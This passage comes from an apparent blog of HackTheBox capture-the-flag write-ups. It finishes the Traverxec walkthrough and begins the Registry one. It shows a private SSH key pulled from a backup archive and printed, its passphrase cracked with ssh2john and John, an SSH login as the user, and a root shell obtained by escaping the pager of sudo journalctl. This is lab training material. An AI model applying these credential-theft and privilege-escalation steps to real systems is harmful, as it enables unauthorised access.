backup-ssh-identity-files.tgz -C /tmp</span><br><span class="line">&lt;rea$ tar zxvf backup-ssh-identity-files.tgz -C /tmp           </span><br><span class="line">home/david/.ssh/</span><br><span class="line">home/david/.ssh/authorized_keys</span><br><span class="line">home/david/.ssh/id_rsa</span><br><span class="line">home/david/.ssh/id_rsa.pub</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$</span><br></pre></td></tr></table></figure><p>I see that there was <code>ssh-key files</code> which I can use to get in with user david.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@traverxec:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">home</span><br><span class="line">systemd-private-52315d40046b4b63a760a2af02bc88ef-systemd-timesyncd.service-3xyrna</span><br><span class="line">update</span><br><span class="line">vmware-root</span><br><span class="line">vmware-root_556-2966037836</span><br><span class="line">www-data@traverxec:/tmp$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">www-data@traverxec:/tmp/home$ ls</span><br><span class="line">ls</span><br><span class="line">david</span><br><span class="line">www-data@traverxec:/tmp/home$ <span class="built_in">cd</span> david</span><br><span class="line"><span class="built_in">cd</span> david</span><br><span class="line">www-data@traverxec:/tmp/home/david$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr 10 19:37 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr 10 19:37 ..</span><br><span class="line">drwx------ 2 www-data www-data 4096 Oct 25 17:02 .ssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp/home/david$ <span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">www-data@traverxec:/tmp/home/david/.ssh$ ls</span><br><span class="line">ls</span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub</span><br></pre></td></tr></table></figure><p>Now what i need is to copy the <code>id_rsa</code> into my machine.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@traverxec:/tmp/home/david/.ssh$ cat id_rsa</span><br><span class="line">cat id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F</span><br><span class="line"></span><br><span class="line">seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG</span><br><span class="line">tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W</span><br><span class="line">KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU</span><br><span class="line">RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7</span><br><span class="line">HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc</span><br><span class="line">Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec</span><br><span class="line">dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN</span><br><span class="line">6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO</span><br><span class="line">xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1</span><br><span class="line">Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6</span><br><span class="line">i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T</span><br><span class="line">fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA</span><br><span class="line">bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so</span><br><span class="line">uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I</span><br><span class="line">Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s</span><br><span class="line">9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U</span><br><span class="line">rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua</span><br><span class="line">4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU</span><br><span class="line">/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX</span><br><span class="line">JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+</span><br><span class="line">XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh</span><br><span class="line">hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf</span><br><span class="line">SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM</span><br><span class="line">j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt</span><br><span class="line">VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">www-data@traverxec:/tmp/home/david/.ssh$</span><br></pre></td></tr></table></figure><h3 id="Decrypt-SSH-Key-with-ssh2john"><a href="#Decrypt-SSH-Key-with-ssh2john" class="headerlink" title="Decrypt SSH Key with ssh2john"></a>Decrypt SSH Key with ssh2john</h3><p>I try to login in SSH with <code>id_rsa</code> I thought i can get in into machine but it needs a passphrase‚Äô to get that i decrypt <code>id_rsa</code> with <code>ssh2john</code> to get the hash.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> took <span class="number">3</span>s </span><br><span class="line">‚ùØ python ssh2john.py id_rsa &gt; id_rsa-hash</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ ls</span><br><span class="line">cve2019_16278.py  david  id_rsa  id_rsa-hash  LinEnum.sh  nmap-Traverxec  ssh2john.py</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ cat id_rsa-hash </span><br><span class="line">id_rsa:$sshng$<span class="number">1</span>$<span class="number">16</span>$<span class="number">477</span>EEFFBA56F9D283D349033D5D08C4F$<span class="number">1200</span>$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Now that I have the hash it‚Äôs time to use <em><code>John</code></em> to decrypt and get the password.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ john id_rsa-hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using <span class="keyword">default</span> input encoding: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="function">password <span class="title">hash</span> (<span class="params">SSH [RSA/DSA/EC/OPENSSH (SSH <span class="keyword">private</span> keys</span>) 32/64])</span></span><br><span class="line"><span class="function">Cost 1 (<span class="params">KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]</span>) <span class="keyword">is</span> 0 <span class="keyword">for</span> all loaded hashes</span></span><br><span class="line"><span class="function">Cost 2 (<span class="params">iteration count</span>) <span class="keyword">is</span> 1 <span class="keyword">for</span> all loaded hashes</span></span><br><span class="line"><span class="function">Will run 4 OpenMP threads</span></span><br><span class="line"><span class="function">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span></span><br><span class="line"><span class="function">finding a possible candidate.</span></span><br><span class="line"><span class="function">Press 'q' or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span></span><br><span class="line"><span class="function"><span class="title">hunter</span>           (<span class="params">id_rsa</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2.7.17 </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure><h3 id="Login-with-SSH-and-get-user-txt"><a href="#Login-with-SSH-and-get-user-txt" class="headerlink" title="Login with SSH and get user.txt"></a>Login with SSH and get user.txt</h3><p>Looks good ! This enough I think, not it‚Äôs time to login with SSH with passphrase <em><code>hunter</code></em>.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ ssh -v -i id_rsa david@<span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line">OpenSSH_8<span class="number">.1</span>p1 Debian<span class="number">-1</span>, OpenSSL <span class="number">1.1</span><span class="number">.1</span>d  <span class="number">10</span> Sep <span class="number">2019</span></span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line <span class="number">19</span>: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> [<span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span>] port <span class="number">22.</span></span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa type <span class="number">-1</span></span><br><span class="line">debug1: identity file id_rsa-cert type <span class="number">-1</span></span><br><span class="line">debug1: Local version <span class="keyword">string</span> SSH<span class="number">-2.0</span>-OpenSSH_8<span class="number">.1</span>p1 Debian<span class="number">-1</span></span><br><span class="line">debug1: Remote protocol version <span class="number">2.0</span>, remote software version OpenSSH_7<span class="number">.9</span>p1 Debian<span class="number">-10</span>+deb10u1</span><br><span class="line">debug1: match: OpenSSH_7<span class="number">.9</span>p1 Debian<span class="number">-10</span>+deb10u1 pat OpenSSH* compat <span class="number">0x04000000</span></span><br><span class="line">debug1: Authenticating to <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span>:<span class="number">22</span> <span class="keyword">as</span> <span class="string">'david'</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;<span class="keyword">implicit</span>&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;<span class="keyword">implicit</span>&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:CiO/pUMzd+<span class="number">6b</span>HnEhA2rAU30QQiNdWOtkEPtJoXnWzVo</span><br><span class="line">debug1: Host <span class="string">'10.10.10.165'</span> <span class="keyword">is</span> known and matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /root/.ssh/known_hosts:<span class="number">7</span></span><br><span class="line">debug1: rekey <span class="keyword">out</span> after <span class="number">134217728</span> blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey <span class="keyword">in</span> after <span class="number">134217728</span> blocks</span><br><span class="line">debug1: Will attempt key: id_rsa  <span class="keyword">explicit</span></span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2<span class="number">-256</span>,rsa-sha2<span class="number">-512</span>,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="keyword">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Trying <span class="keyword">private</span> key: id_rsa</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>: </span><br><span class="line">debug1: <span class="function">Authentication <span class="title">succeeded</span> (<span class="params">publickey</span>).</span></span><br><span class="line"><span class="function">Authenticated to 10.10.10.165 (<span class="params">[<span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span>]:<span class="number">22</span></span>).</span></span><br><span class="line"><span class="function">debug1: channel 0: new [client-session]</span></span><br><span class="line"><span class="function">debug1: Requesting no-more-sessions@openssh.com</span></span><br><span class="line"><span class="function">debug1: Entering interactive session.</span></span><br><span class="line"><span class="function">debug1: pledge: network</span></span><br><span class="line"><span class="function">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span></span><br><span class="line"><span class="function">debug1: Remote: /home/david/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding</span></span><br><span class="line"><span class="function">debug1: Sending environment.</span></span><br><span class="line"><span class="function">debug1: Sending env LANG</span> = en_US.utf8</span><br><span class="line">Linux traverxec <span class="number">4.19</span><span class="number">.0</span><span class="number">-6</span>-amd64 <span class="meta">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span></span><br><span class="line">Last login: Fri Apr <span class="number">10</span> <span class="number">19</span>:<span class="number">06</span>:<span class="number">53</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">10.10</span><span class="number">.15</span><span class="number">.162</span></span><br><span class="line">david@traverxec:~$ whoami</span><br><span class="line">david</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">david@traverxec:~$ ls</span><br><span class="line">bin  public_www  user.txt</span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line"><span class="number">7</span>db0b[--------------------]<span class="number">82f</span>3d</span><br><span class="line">david@traverxec:~$</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="JOURNALCTL"><a href="#JOURNALCTL" class="headerlink" title="JOURNALCTL"></a>JOURNALCTL</h3><p>This part was tricky the user <em><code>david</code></em> is allowed to run with <em><code>sudo</code></em> command with <code>journalctl</code> which has privilege unto root, but when I try to run <code>sudo -l</code> it requesting for a password I think that was not the right thing to do. so I search about the <code>journalctl</code> and luckily I found it on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFObins</a></p><p><img src="/img/traverxec/journalctl.PNG" alt="HackTheBox-Traverxec" title="Traverxec JOURNALCTL"></p><p>It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on <em><code>sudo</code></em>. so I examined first the file <code>server-stats.head</code> this is a HEAD file which is (another file in the bin directory) and some information about the server. </p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ cat server-stats.head</span><br><span class="line">                                                                          .----.</span><br><span class="line">                                                              .---------. | == |</span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">""</span><span class="string">""</span><span class="string">"-.| |----|</span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |</span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|</span></span><br><span class="line"><span class="string">                                                              |'-.....-'| |::::|</span></span><br><span class="line"><span class="string">                                                              '"</span><span class="string">")---("</span><span class="string">"' |___.|</span></span><br><span class="line"><span class="string">                                                             /:::::::::::\"    "</span></span><br><span class="line">                                                            /:::=======:::\</span><br><span class="line">                                                        jgs <span class="string">'"""""""""""""'</span> </span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$</span><br></pre></td></tr></table></figure><p>The last line of <code>server-stats.sh</code> was very important. It runs sudo first, and then journalctl, which means journalctl is running with root privileges. Therefore, if we can control journalctl, we have root privileges. However, we cannot seem to change any parameters. When running anything <code>sudo journalctl -n5 -unostromo.service</code> other than that, a password will be required.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ cat server-stats.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cat /home/david/bin/server-stats.head</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Load: `/usr/bin/uptime`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">" "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Last 5 journal log lines:"</span></span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat </span><br><span class="line">david@traverxec:~/bin$</span><br></pre></td></tr></table></figure><p>running the <em><code>server-stats.sh</code></em></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ server-stats.sh</span><br><span class="line">                                                                          .----.</span><br><span class="line">                                                              .---------. | == |</span><br><span class="line">   Webserver Statistics and Data                              |.-<span class="string">""</span><span class="string">""</span><span class="string">"-.| |----|</span></span><br><span class="line"><span class="string">         Collection Script                                    ||       || | == |</span></span><br><span class="line"><span class="string">          (c) David, 2019                                     ||       || |----|</span></span><br><span class="line"><span class="string">                                                              |'-.....-'| |::::|</span></span><br><span class="line"><span class="string">                                                              '"</span><span class="string">")---("</span><span class="string">"' |___.|</span></span><br><span class="line"><span class="string">                                                             /:::::::::::\"    "</span></span><br><span class="line">                                                            /:::=======:::\</span><br><span class="line">                                                        jgs <span class="string">'"""""""""""""'</span> </span><br><span class="line"></span><br><span class="line">Load:  19:52:22 up 1 min,  1 user,  load average: 0.16, 0.09, 0.03</span><br><span class="line"> </span><br><span class="line">Open nhttpd sockets: 2</span><br><span class="line">Files <span class="keyword">in</span> the docroot: 117</span><br><span class="line"> </span><br><span class="line">Last 5 journal <span class="built_in">log</span> lines:</span><br><span class="line">-- Logs begin at Thurs 2020-04-09 19:50:59 EDT, end at Fri 2020-04-10 19:52:23 EDT. --</span><br><span class="line">Apr 10 19:51:03 traverxec systemd[1]: nostromo.service: Can<span class="string">'t open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: started</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: max. file descriptors = 1040 (cur) / 1040 (max)</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec systemd[1]: Started nostromo nhttpd server.</span></span><br><span class="line"><span class="string">Apr 10 19:51:38 traverxec nhttpd[729]: /../../../../bin/sh sent a bad cgi header</span></span><br><span class="line"><span class="string">david@traverxec:~/bin$</span></span><br></pre></td></tr></table></figure><h3 id="Get-the-ADMIN-Shell"><a href="#Get-the-ADMIN-Shell" class="headerlink" title="Get the ADMIN Shell"></a>Get the ADMIN Shell</h3><p>So this is the tricky part. I need to shrink my terminal size into small in order to execute <em><code>!/bin/bash</code></em> command and get the root.<br>first is I need to run <em><code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></em> which has root privileges, it‚Äôs something like this.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br></pre></td></tr></table></figure><p>before we execute it I will change my terminal size into small like this.</p><p><img src="/img/traverxec/root-traverxec1.png" alt="HackTheBox-Traverxec" title="Traverxec JOURNALCTL"></p><p>execute <code>!/bin/bash</code> command and finally I get the root shell and get the <code>root.txt</code></p><p>after you go back the terminal size to normal it look like this.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line">-- Logs begin at Fri 2020-04-10 19:50:59 EDT, end at Fri 2020-04-10 19:57:00 EDT. --</span><br><span class="line">Apr 10 19:51:03 traverxec systemd[1]: nostromo.service: Can<span class="string">'t open PID file /var/nostromo/logs/n</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: started</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: max. file descriptors = 1040 (cur) / 1040 (max)</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec systemd[1]: Started nostromo nhttpd server.</span></span><br><span class="line"><span class="string">Apr 10 19:51:38 traverxec nhttpd[729]: /../../../../bin/sh sent a bad cgi header</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string">root@traverxec:/home/david/bin#</span></span><br></pre></td></tr></table></figure><p>get the <code>root.txt</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root@traverxec:/home/david/bin<span class="comment"># cd /root</span></span><br><span class="line">root@traverxec:~<span class="comment"># ls</span></span><br><span class="line">nostromo_1.9.6-1.deb  root.txt</span><br><span class="line">root@traverxec:~<span class="comment"># cat root.txt</span></span><br><span class="line">9aa36[--------------------]0d906</span><br><span class="line">root@traverxec:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="https://www.exploit-db.com/exploits/47837" target="_blank" rel="noopener">nostromo 1.9.6 - Remote Code Execution</a></p><p><a href="https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec" target="_blank" rel="noopener">Nostromo Directory Traversal Remote Command Execution</a></p><p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFObins</a></p><p><a href="https://gtfobins.github.io/gtfobins/journalctl/" target="_blank" rel="noopener">.. / journalctl</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> GTFObins </tag>
            
            <tag> linux </tag>
            
            <tag> retired </tag>
            
            <tag> cve </tag>
            
            <tag> ssh </tag>
            
            <tag> lfi </tag>
            
            <tag> traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Registry</title>
      <link href="/2020-04-05/HackTheBox-Registry/"/>
      <url>/2020-04-05/HackTheBox-Registry/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/registry/registry-info.png" alt="HackTheBox-Registry" title="Registry machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí My very first Hard box is now retired. A machine where you can exploit if you know what the technology is used. The initial scan has give me a big hint that this machine is using <a href="https://www.docker.com/" target="_blank" rel="noopener">Docker</a> and 3rd party server named <code>REGISTRY Server</code>.<br>   And in the server there‚Äôs a lot container which I downloaded and find an <code>SSH Key</code> to get in to the machine and get the <code>user.txt</code>.<br>   On my Privilege Escalation to the box‚Äô I found out that I need to do lateral movement to the <code>www-data</code> shell which basically the webserver. From that, user can abuse <code>SUDOERS rights</code> by running the <code>Restic</code> and create a backup for root directory to my Kali Linux machine and get the shell and <code>root.txt</code>.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí put the <code>commonName</code> in <code>/etc/hosts/</code> file that appear on the <strong><em>Nmap Scan</em></strong></p><p>‚Üí Download and analyze the <code>install file</code></p><p>‚Üí Visit the <code>docker.registry.htb</code> and Look for interesting stuff in a <strong><em>Docker API</em></strong></p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Enumerating the <strong><em>Docker API</em></strong> by following this <a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/" target="_blank" rel="noopener">method</a></p><p>‚Üí Found the docker repository that contains image called <strong><em>bolt-image</em></strong></p><p>‚Üí Found the some blobs file from <code>latest</code></p><p>‚Üí Download all the blob files and try to look for a password or ssh key</p><p>‚Üí Get in to the Registry 